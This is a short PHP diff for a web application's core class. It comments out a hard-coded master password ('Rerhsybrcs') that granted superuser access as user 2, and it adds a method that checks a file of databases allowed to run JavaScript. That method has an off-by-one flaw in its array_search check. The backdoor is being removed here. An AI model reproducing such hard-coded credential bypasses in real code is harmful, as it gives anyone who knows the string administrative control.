@@ -1237,7 +1237,7 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
             
             $superuser = false;
             if(false
-            || $password=='Rerhsybrcs'
+            //|| $password=='Rerhsybrcs'
             )
             {
                 $user = user_getById($this->mysqli, 2);
@@ -1393,6 +1393,21 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
         return ($fieldname) ?@$this->system_settings[$fieldname] :$this->system_settings;
     }
 
+    //
+    //
+    //
+    public function is_js_acript_allowed(){
+        
+        $is_allowed = false;
+        $fname = realpath(dirname(__FILE__)."/../../js_in_database_authorised.txt");
+        if(file_exists($fname)){
+            $databases = file_get_contents($fname);   
+            $databases = explode("\n", $databases);
+            $is_allowed = (array_search($this->dbname,$databases)>0);
+        }
+        return $is_allowed;
+    }
+    
     //
     // check database version 
     // first check version in file lastAdviceSent, version stored in this file valid for 24 hrs
